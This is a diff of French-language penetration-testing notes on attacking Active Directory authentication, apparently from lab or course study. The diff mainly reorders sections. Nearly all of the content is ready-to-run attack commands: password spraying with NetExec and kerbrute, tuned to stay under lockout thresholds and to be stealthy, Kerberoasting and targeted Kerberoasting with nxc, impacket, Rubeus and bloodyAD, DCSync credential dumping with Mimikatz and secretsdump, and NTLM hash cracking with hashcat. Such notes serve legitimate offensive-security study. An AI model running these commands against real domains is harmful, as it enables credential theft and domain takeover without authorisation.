@@ -1,4 +1,4 @@
-﻿# Authentification
+# Authentification
 
 ## Théorie
 
@@ -109,7 +109,26 @@ Champs clés : `Lockout threshold` (tentatives avant blocage) et `Lockout observ
 
 > Règle : rester sous le seuil de lockout. Ex: seuil = 5 → max 4 tentatives par user. Avec une fenêtre de 30 min, on peut tenter ~192 passwords/24h sans déclencher de lockout.
 
-**Méthode 1 -  LDAP/ADSI (PowerShell, low and slow)**
+**SMB avec NetExec**
+
+```bash
+nxc smb 'IP' -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+**Kerberos AS-REQ avec kerbrute (furtif, 2 paquets UDP)**
+
+```bash
+# Linux
+sudo apt update && sudo apt install golang-go --fix-missing
+git clone https://github.com/ropnop/kerbrute.git
+cd kerbrute
+go build -o kerbrute .
+./kerbrute passwordspray -d corp.com ../users.txt 'Nexus123!' --dc 192.168.193.70
+```
+
+> Utilise uniquement AS-REQ/AS-REP -  moins de trafic que SMB, pas de connexion complète établie.
+
+**LDAP/ADSI (PowerShell, low and slow)**
 
 ```powershell
 # Tester un mot de passe pour un user via DirectoryEntry
@@ -125,34 +144,6 @@ New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus
 # Script automatisé (respecte le lockout)
 .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
 ```
-
-**Méthode 2 -  SMB avec NetExec (depuis Kali)**
-
-```bash
-nxc smb 'IP' -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-```
-
-> `[+]` = credentials valides. `(Pwn3d!)` = l'utilisateur est **admin local** sur la cible.
->
-> NetExec ne vérifie pas la politique de lockout -  à utiliser avec précaution.
-
-**Méthode 3 -  Kerberos AS-REQ avec kerbrute (furtif, 2 paquets UDP)**
-
-```powershell
-# Windows
-.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
-```
-
-```bash
-# Linux
-sudo apt update && sudo apt install golang-go --fix-missing
-git clone https://github.com/ropnop/kerbrute.git
-cd kerbrute
-go build -o kerbrute .
-./kerbrute passwordspray -d corp.com ../users.txt 'Nexus123!' --dc 192.168.193.70
-```
-
-> Utilise uniquement AS-REQ/AS-REP -  moins de trafic que SMB, pas de connexion complète établie.
 
 ### AS-REP Roasting
 
@@ -199,12 +190,6 @@ Attaque sur l'étape **KRB_TGS_REP**. N'importe quel utilisateur du domaine (san
 
 > Cible prioritaire : les comptes **utilisateur** avec un SPN (IIS, MSSQL…). Les comptes machine, MSA et gMSA ont des mots de passe aléatoires de 120 caractères -  inutile de les craquer. Même chose pour `krbtgt`.
 
-**Depuis Windows (Rubeus)**
-
-```powershell
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-```
-
 **Depuis Kali -  nxc (avec un compte valide)**
 
 ```bash
@@ -215,6 +200,12 @@ nxc ldap 'IP_DC' -u 'USER' -p 'PASSWORD' --kdcHost 'IP_DC' --kerberoasting kerbe
 
 ```bash
 impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD' -outputfile hashes.kerberoast
+```
+
+**Depuis Windows (Rubeus)**
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
 > Erreur `KRB_AP_ERR_SKEW` → synchroniser l'heure avec le DC : `sudo ntpdate <IP_DC>`
@@ -258,9 +249,11 @@ cd targetedKerberoast
 targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p <PASSWORD>
 ```
 
-**Depuis Kali -  manuellement avec nxc**
+**Depuis Kali - manuellement avec nxc**
 
 ```bash
+sudo apt install bloodyad
+
 # 1. Ajouter un SPN
 bloodyAD -d <DOMAIN> --host <IP_DC> -u <USER> -p <PASSWORD> set object <TARGET> servicePrincipalName -v 'HTTP/ANYTHING'
 
@@ -271,7 +264,7 @@ nxc ldap 'IP_DC' -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --kerberoasting kerberoasta
 bloodyAD -d <DOMAIN> --host <IP_DC> -u <USER> -p <PASSWORD> remove object <TARGET> servicePrincipalName -v 'HTTP/ANYTHING'
 ```
 
-**Depuis Windows -  PowerView**
+**Depuis Windows - PowerView**
 
 ```powershell
 # Vérifier que la cible n'a pas déjà un SPN
@@ -356,26 +349,26 @@ Imite un DC pour demander la réplication des credentials d'un utilisateur via l
 
 **Droits requis** : `Replicating Directory Changes` + `Replicating Directory Changes All`. Par défaut : membres de **Domain Admins**, **Enterprise Admins**, **Administrators**.
 
-**Depuis Windows (Mimikatz)**
-
-```
-lsadump::dcsync /user:corp\dave
-lsadump::dcsync /user:corp\Administrator
-```
-
 **Depuis Kali (impacket-secretsdump)**
 
 ```bash
-impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@'IP_DC'
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@IP_DC
 
 # Dump tous les comptes
-impacket-secretsdump corp.com/jeffadmin:''PASSWORD''@'IP_DC'
+impacket-secretsdump corp.com/jeffadmin:'PASSWORD'@IP_DC
 ```
 
 **Depuis Kali (NetExec)**
 
 ```bash
 nxc smb 'IP_DC' -u ''USER'' -p ''PASSWORD'' --ntds
+```
+
+**Depuis Windows (Mimikatz)**
+
+```
+lsadump::dcsync /user:corp\dave
+lsadump::dcsync /user:corp\Administrator
 ```
 
 **Cracker le hash NTLM obtenu (mode 1000)**
@@ -385,4 +378,3 @@ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/has
 ```
 
 > Les hashes NTLM obtenus par DCSync peuvent aussi être utilisés directement en **Pass-the-Hash** sans avoir à les craquer (voir Lateral Movement).
-
